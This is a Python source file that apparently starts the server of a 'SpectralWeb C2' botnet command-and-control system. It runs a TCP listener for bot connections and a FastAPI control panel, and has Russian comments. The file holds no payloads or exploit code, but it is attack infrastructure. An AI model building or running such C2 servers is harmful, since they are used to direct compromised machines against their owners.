# backend\Core\Server.py

import asyncio
import multiprocessing
import webbrowser
from logs import Log as logger
from backend import IP, PORT, API_PORT
from backend.API import run_fastapi_server
from .ClientConnection import client_handler
from backend import start_benchmark

async def start_server():
    log_queue = multiprocessing.Queue()

    # Запуск TCP сервера для ботов
    server = await asyncio.start_server(
        client_handler,
        IP, PORT,
        reuse_address=True,
        backlog=1000,
        limit=1024 * 1024 * 5
    )

    addr = server.sockets[0].getsockname()
    logger.info(f"[+] TCP C2 Server started on {addr}")

    # Формируем список основных задач
    log_task = asyncio.create_task(logger.start_queue_listener(log_queue))
    api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))

    # Вспомогательные функции
    start_benchmark(asyncio.get_running_loop(), interval=1)
    webbrowser.open(f"http://{IP}:{API_PORT}/")
    
    logger.info(f"[*] SpectralWeb C2 System is running on http://{IP}:{API_PORT}")

    async with server:
        try:
            # Теперь ждем только сервер и основные задачи
            await asyncio.gather(server.serve_forever(), log_task, api_task)
        except asyncio.CancelledError:
            logger.info("[*] Server shutdown initiated.")
        finally:
            # Чистое завершение
            log_queue.put("STOP")
            api_task.cancel()
            await asyncio.gather(log_task, api_task, return_exceptions=True)
            logger.info("[*] Server stopped.")